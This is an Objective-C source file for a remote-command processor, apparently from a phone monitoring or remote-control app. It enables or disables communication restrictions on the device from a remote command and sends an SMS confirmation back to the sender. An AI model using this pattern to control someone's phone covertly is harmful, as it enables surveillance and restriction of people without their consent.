//
//  EnableCommunicationRestrictionsProcessor.m
//  RCM
//
//  Created by Makara Khloth on 6/27/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "EnableCommunicationRestrictionsProcessor.h"
#import "PrefRestriction.h"

@interface EnableCommunicationRestrictionsProcessor (PrivateAPI)
- (BOOL) isValidFlag;
- (void) processCommunicationRestrictions;
- (void) setCommunicationRestrictionsException;
- (void) sendReplySMS;
@end

@implementation EnableCommunicationRestrictionsProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the EnableCommunicationRestrictionsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(EnableCommunicationRestrictions)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"EnableCommunicationRestrictionsProcessor--->initWithRemoteCommandData...");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark EnableCommunicationRestrictions Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the EnableCommunicationRestrictionsProcessor
 - Argument list and description: 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"EnableCommunicationRestrictionsProcessor--->doProcessingCommand");
	if ([self isValidFlag])	[self processCommunicationRestrictions];
	else [self setCommunicationRestrictionsException];
	
}

#pragma mark EnableCommunicationRestrictions PrivateAPI Methods

/**
 - Method name: processCommunicationRestrictions
 - Purpose:This method is used to enable/disable communication restrictions
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) processCommunicationRestrictions {
	DLog (@"EnableCommunicationRestrictionsProcessor--->processCommunicationRestrictions");
	NSUInteger flagValue = [[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefRestriction *prefRestriction = (PrefRestriction *)[prefManager preference:kRestriction];
	[prefRestriction setMEnableRestriction:flagValue];
	[prefManager savePreferenceAndNotifyChange:prefRestriction];
	[self sendReplySMS];
}

/**
 - Method name: isValidFlag
 - Purpose:This method is used to validate the Arguments
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

- (BOOL) isValidFlag {
	DLog (@"EnableCommunicationRestrictionsProcessor--->isValidFlag")
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) isValid=[RemoteCmdProcessorUtils isZeroOrOneFlag:[args objectAtIndex:2]];	
	return isValid;
}

/**
 - Method name: setCommunicationRestrictionsException
 - Purpose:This method is invoked when set visiblity Process is failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) setCommunicationRestrictionsException {
	DLog (@"EnableCommunicationRestrictionsProcessor--->setCommunicationRestrictionsException")
	FxException* exception = [FxException exceptionWithName:@"EnableCommunicationRestrictions"
												  andReason:@"Enable communication restriction error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"EnableCommunicationRestrictionsProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *replyMessage=NSLocalizedString(@"kEnableCommunicationRestrictionsMSG", @"");
	if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue]==1) 
		replyMessage = [NSString stringWithFormat:replyMessage, NSLocalizedString(@"kEnabled", @"")];
	else 
    	replyMessage = [NSString stringWithFormat:replyMessage, NSLocalizedString(@"kDisabled", @"")];
	
	replyMessage=[messageFormat stringByAppendingString:replyMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:replyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:replyMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}

@end